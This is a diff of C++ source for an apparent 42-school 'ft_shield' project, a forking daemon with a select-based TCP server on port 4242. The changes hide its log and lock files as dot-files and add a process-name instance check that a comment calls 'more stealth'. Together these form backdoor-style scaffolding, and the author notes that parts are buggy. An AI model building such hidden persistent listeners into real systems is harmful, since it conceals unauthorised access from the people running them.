@@ -6,7 +6,7 @@
 /*   By: halvarez <halvarez@student.42.fr>          +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2023/10/23 16:44:39 by halvarez          #+#    #+#             */
-/*   Updated: 2023/11/20 14:47:54 by halvarez         ###   ########.fr       */
+/*   Updated: 2023/11/20 17:23:48 by halvarez         ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -19,27 +19,27 @@
 #include <string.h>
 #include <sys/stat.h>
 #include <sys/select.h>
+#include <sys/wait.h>
 #include <arpa/inet.h>
 
 #include "Ft_Shield.hpp"
 
 #define EXIT_SUCCESS 0
 #define EXIT_FAILURE 1
-#define DAEMON_LOG_PATH "/var/log/matt_daemon"
-#define DAEMON_LOCK_FILE "/var/lock/matt_daemon"
+#define DAEMON_LOG_FILE "/var/log/.matt_daemon"
+#define DAEMON_LOCK_FILE "/var/lock/.matt_daemon"
 
 /* Constructors ============================================================= */
-Ft_Shield::Ft_Shield(void) : _port(4242), _MaxClients(3), _run(true), _lockFile(-1), _logFile(-1)
+Ft_Shield::Ft_Shield(void) : _port(4242), _MaxClients(3), _run(true), _lockFile(-1), _logFile(-1), _nClients(0)
 {
 	sockaddr_in		&addrIn 	= *reinterpret_cast<sockaddr_in *>(&this->_addr);
 
+	/* Define the server parameters */
 	addrIn.sin_family = AF_INET;
 	//addrIn.sin_addr.s_addr = INADDR_ANY;
 	addrIn.sin_addr.s_addr = inet_addr("127.147.6.1");
 	addrIn.sin_port = htons(this->_port);
 
-	/* Add a sginal handler for interrution */
-	
 	/* Map the commands into the command-mapper t_commands */
 	this->_cmdMap["shutdown\n"] = &Ft_Shield::_shutdown;
 	return;
@@ -59,6 +59,8 @@ Ft_Shield::~Ft_Shield(void)
 	 */
 	close(this->_lockFile);
 	remove(DAEMON_LOCK_FILE);
+	close(this->_logFile);
+	remove(DAEMON_LOG_FILE);
 	return;
 }
 
@@ -75,10 +77,6 @@ void Ft_Shield::daemonize(void)
 	char buf[9] = {'\0'};
 
 	std::cout << "halvarez" << std::endl;
-	/* Redirect stdin, stdout and stderr to /dev/null */
-	//freopen("/dev/null", "r", stdin);
-	//freopen("/dev/null", "w", stdout);
-	//freopen("/dev/null", "w", stderr);
 	/* First fork to detach from the current processus */
 	pid = fork();
 	if (pid == -1)
@@ -100,11 +98,11 @@ void Ft_Shield::daemonize(void)
 			/* Set default permisions */
 			umask(0000);
 			/* Test if log path exists, creates it and moves in otherwise */
-			if (chdir(DAEMON_LOG_PATH) == -1)
+			if (chdir(DAEMON_LOG_FILE) == -1)
 			{
-				if (mkdir(DAEMON_LOG_PATH, 0755) == -1)
+				if (mkdir(DAEMON_LOG_FILE, 0755) == -1)
 					this->_run = false;
-				if (chdir(DAEMON_LOG_PATH) == -1)
+				if (chdir(DAEMON_LOG_FILE) == -1)
 					this->_run = false;
 			}
 			/* 
@@ -133,32 +131,41 @@ void Ft_Shield::daemonize(void)
 /* Private member functions ================================================= */
 /*
  * Check if another instance is already running, quit if yes, continue otherwise
+ * Check by process name instead of get a lock file : more stealth
+ * it's buggy
  */
-/*
 void	Ft_Shield::_checkInstance(void)
 {
 	int		fd[2];
+	int		pid;
 	char	char_buf[100] = {'\0'};
 
-	this->_lockFile = open(DAEMON_LOCK_FILE, O_RDWR | O_CREAT | O_EXCL);
+	//this->_lockFile = open(DAEMON_LOCK_FILE, O_RDWR | O_CREAT | O_EXCL);
 	if (pipe(fd) != -1)
 	{
-			//
+			/*
 			 * Check return value of ps axco | grep ft_shield
 			 * Set this->_run to false if another ft_shield process is running
-			 //
-		dup2(STDOUT_FILENO_, fd[1]);
-		close(STDOUT_FILENO_);
-		system("ps axco | grep ft_shield");
-		read(fd[0], char_buf, 99);
-		this->_buffer = char_buf;
-		dup2(fd[1], STDOUT_FILENO_);
-		close(fd[0]);
-		close(fd[1]);
+			 */
+		pid = fork();
+		if (pid == 0)
+		{
+			close(fd[0]);
+			close(STDOUT_FILENO);
+			dup2(fd[1], STDOUT_FILENO);
+			system("ps axco pid,command | grep ft_shield");
+		}
+		else if (pid != 0)
+		{
+			close(fd[1]);
+			waitpid(pid, NULL, 0);
+			read(fd[0], char_buf, 99);
+			this->_buffer = char_buf;
+			close(fd[0]);
+		}
 	}
 	return;
 }
-*/
 
 /* 
  * Configure a server listening on this->_port (4242)
@@ -204,26 +211,33 @@ void	Ft_Shield::_runSrv(void)
 		write_set = master_set;
 		if (select(maxfd + 1, &read_set, &write_set, NULL, NULL) < 0)
 			continue;
-		for(int fd = 0; fd <= maxfd; fd++)
+		for(int fd = 3; fd <= maxfd; fd++)
 		{
 			if (FD_ISSET(fd, &read_set) && fd == this->_socket)
 			{
 				client = accept(this->_socket, &this->_addr, &lenaddr);
-				if (client == -1)
-					continue;
-				FD_SET(client, &master_set);
-				maxfd = client > maxfd ? client : maxfd;
-				send(client, "Connected to ft_shield\n", 24, 0);
-
+				if (client != -1 && this->_nClients < this->_MaxClients)
+				{
+					FD_SET(client, &master_set);
+					maxfd = client > maxfd ? client : maxfd;
+					this->_nClients++;
+					send(client, "Connected to ft_shield\n", 24, 0);
+				}
+				else if (client != -1)
+				{
+					send(client, "Sorry, too much connexions\n", 28, 0);
+					close(client);
+				}
 			}
 			if (FD_ISSET(fd, &read_set) && fd != this->_socket)
 			{
 				/* if res == 0 : disconnection case */
 				res = recv(fd, char_buf, 99, MSG_PEEK);
-				if (res == 0)
+				if (res <= 0)
 				{
 					close(fd);
 					maxfd = (fd == maxfd) ? maxfd - 1 : maxfd;
+					this->_nClients--;
 				}
 				else
 				{
